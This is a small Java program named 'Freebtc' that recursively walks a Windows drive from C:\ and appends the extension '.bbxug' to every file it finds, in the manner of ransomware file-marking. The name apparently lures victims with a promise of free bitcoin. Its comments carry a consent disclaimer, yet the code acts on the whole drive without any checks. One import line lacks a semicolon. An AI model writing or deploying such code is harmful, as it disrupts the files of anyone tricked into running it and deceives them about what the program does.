import java.io.File;
import java.io.IOException
//Developed by emittytech
public class Freebtc{
    public static void main(String[] args) throws IOException {
        // Please note that modifying files on the user's computer without their consent is intrusive and potentially harmful.
        // This code is for demonstration purposes only, and you should obtain proper user consent before modifying files.

        // Provide the root directory you want to start file extension changing.
        String rootDirectory = "C:\\"; // Change this to your desired root directory.

        // Run the file extension changing procedure.
        change(rootDirectory);

        
    }

    private static void change(String directory) {
        File folder = new File(directory);
        
        // Iterate over all files and directories.
        for (File file : folder.listFiles()) {
            if (file.isFile()) {
                // Rename the file by appending ".bbxug" or use your prefer extension to the original filename.
                String newFileName = file.getName() + ".bbxug";
                File newFile = new File(file.getParent(), newFileName);
                
                // Rename the file.
                file.renameTo(newFile);
            } else if (file.isDirectory()) {
                // Recursively change the file extensions within the subdirectories.
                change(file.getAbsolutePath());
            }
        }
    }

 
}
